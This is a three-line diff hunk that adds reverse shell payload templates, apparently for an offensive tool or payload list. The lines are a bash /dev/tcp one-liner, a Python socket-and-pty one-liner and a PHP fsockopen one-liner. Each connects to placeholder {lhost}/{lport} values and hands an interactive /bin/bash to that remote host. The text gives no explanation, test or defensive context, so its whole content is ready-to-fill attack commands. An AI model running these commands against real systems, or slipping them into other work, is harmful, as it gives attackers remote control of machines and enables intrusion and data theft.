@@ -1,0 +1,3 @@
+bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/bash -i <&3 >&3 2>&3");'
